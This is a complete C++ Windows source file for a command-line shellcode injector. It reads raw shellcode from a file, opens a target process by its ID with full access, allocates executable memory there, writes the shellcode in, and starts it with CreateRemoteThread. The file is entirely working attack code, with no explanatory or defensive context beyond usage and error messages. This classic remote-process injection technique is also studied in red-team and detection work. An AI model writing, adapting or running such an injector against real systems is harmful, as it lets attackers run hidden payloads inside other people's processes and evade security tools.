#include <iostream>
#include <fstream>
#include <vector>
#include <iterator>
#include <string>
#include <iomanip>

#include <Windows.h>



std::vector<char> ReadShellCode(const std::string& shellcodePath) {
	//Reading file in binary mode
	std::ifstream shellcodeFile(shellcodePath, std::ios::binary);

	if (!shellcodeFile.is_open()) {
		std::cerr << "Error opening " << shellcodePath << std::endl;
		exit(EXIT_FAILURE);
	}

	//istreambuf_iterator<unsiged char> wont work so we need to use char array and then cast it to unsigned char*
	std::vector<char> shellcode(std::istreambuf_iterator<char>(shellcodeFile), {});
	return shellcode;
}



int main(int argc, char** argv) {

	if (argc > 3 || argc <= 2) {
		std::cout << "Usage: " << argv[0] << " shellcodePath PID" << std::endl;
		exit(EXIT_FAILURE);
	}

	//Path to shellcode
	std::string shellcodePath = argv[1];
	std::vector<char> shellcode = ReadShellCode(shellcodePath);

	//PID of target proc
	int pid = atoi(argv[2]);

	HANDLE hThread = nullptr;
	DWORD hThreadId = 0;

	HANDLE hProc = nullptr;

	/*
	for (auto& i : shellcode) {
		std::cout << "0x" << std::hex << std::setfill('0') << std::setw(2) <<  (0xff & i) << " " << std::dec;
	}*/

	hProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
	if (hProc == NULL) {
		std::cerr << "Error while opening process. Code: " << GetLastError() << std::endl;
		exit(EXIT_FAILURE);
	}

	LPVOID hProcBuf = VirtualAllocEx(hProc, NULL, shellcode.size(), (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
	if (hProcBuf == NULL) {
		std::cerr << "Error while allocating memory. Code: " << GetLastError() << std::endl;
		CloseHandle(hProc);
		exit(EXIT_FAILURE);
	}

	bool wpmSuccess = WriteProcessMemory(hProc, hProcBuf, reinterpret_cast<BYTE*>(shellcode.data()), shellcode.size(), NULL);
	if (!wpmSuccess) {
		std::cerr << "Error while writing shellcode. Code: " << GetLastError() << std::endl;
		CloseHandle(hProc);
		exit(EXIT_FAILURE);
	}

	hThread = CreateRemoteThread(hProc, NULL, NULL, (LPTHREAD_START_ROUTINE)hProcBuf, NULL, 0, &hThreadId);
	if (hThread == NULL) {
		std::cerr << "Error while creating remote thread. Code: " << GetLastError() << std::endl;
		CloseHandle(hProc);
		exit(EXIT_FAILURE);
	}

	std::cout << "Remote thread thread id: " << hThreadId << std::endl;

	CloseHandle(hThread);
	CloseHandle(hProc);

	return 0;
}
